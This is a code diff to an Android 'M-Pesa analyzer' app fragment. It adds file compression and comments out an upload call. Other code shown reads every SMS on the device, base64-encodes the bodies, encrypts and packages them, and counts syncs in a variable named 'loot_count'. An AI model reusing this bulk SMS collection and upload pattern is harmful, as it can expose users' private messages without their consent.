@@ -47,6 +47,7 @@ import com.niccher.mpesa_analyzer.MainActivity;
 import com.niccher.mpesa_analyzer.R;
 import com.niccher.mpesa_analyzer.adapter.Info_adapter;
 import com.niccher.mpesa_analyzer.helpers.Encryptor;
+import com.niccher.mpesa_analyzer.helpers.Kompressors;
 import com.niccher.mpesa_analyzer.helpers.Prefs;
 import com.niccher.mpesa_analyzer.helpers.ServiceGenerator;
 import com.niccher.mpesa_analyzer.helpers.SummaryResponse;
@@ -171,8 +172,6 @@ public class Frag_Home extends Fragment {
         return  solv;
     }
 
-
-
     public void reqPermission(String permission, int requestCode){
         text_get_loot_count.setText("Synced "+String.valueOf(prefs.get_prefs_auth("loot_count", getActivity())) + " times.");
 
@@ -254,13 +253,19 @@ public class Frag_Home extends Fragment {
             fos = getActivity().openFileOutput(kon.string_enc_b64_file+file_name, MODE_PRIVATE);
             fos.write(big_data_enc.getBytes());
 
-            File fi4 = new File(getActivity().getFilesDir() + "/" + kon.string_enc_b64_file+file_name);
-            File fi40 = new File(getActivity().getFilesDir() + "/" + kon.string_enc_aes_files+file_name);
+            File File_enc_b64 = new File(getActivity().getFilesDir() + "/" + kon.string_enc_b64_file+file_name);
+            File File_enc_aes = new File(getActivity().getFilesDir() + "/" + kon.string_enc_aes_files+file_name);
 
-            InputStream in = new BufferedInputStream(new FileInputStream(fi4));
-            Cryptor(fi40, in);
+            File File_target_zip_b64 = new File(getActivity().getFilesDir() + "/" + kon.string_zip_b64_files+file_name);//File_enc_b64_zip_target_link
+            File File_target_zip_aes = new File(getActivity().getFilesDir() + "/" + kon.string_zip_aes_files+file_name);//File_enc_aes_zip_target_link
 
-            init.Parser_Upload(fi40, file_name);
+            InputStream file_i_s = new BufferedInputStream(new FileInputStream(File_enc_b64));
+            Cryptor(File_enc_aes, file_i_s);
+
+            File File_enc_zip_b64 = Kompressors.FileKompress(String.valueOf(File_enc_b64), String.valueOf(File_target_zip_b64));
+            File File_enc_zip_aes = Kompressors.FileKompress(String.valueOf(File_enc_aes), String.valueOf(File_target_zip_aes));
+
+            //init.Parser_Upload(fi40, file_name);
 
         } catch (FileNotFoundException e) {
             Log.e(kon.TAGGED,"Error 1  "+e.getMessage());
@@ -346,12 +351,13 @@ public class Frag_Home extends Fragment {
                 if (c.moveToFirst()) {
                     sbsent = new StringBuffer();
                     for (int j = 0; j < totalSMS; j++) {
-                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
-                        String smsNumber = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
-                        String smsBody = Base64.encodeToString(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).getBytes(), Base64.DEFAULT);;
-                        String smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN));
-                        String smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
-                        String sms_id = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));
+                        String smsDate = "", smsNumber = "", smsBody = "", smsSeen = "", smsThreadid = "", sms_id = "";
+                        smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                        smsNumber = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                        smsBody = Base64.encodeToString(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).getBytes(), Base64.DEFAULT);;
+                        smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN));
+                        smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
+                        sms_id = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));
 
                         String smsType = "";
                         switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
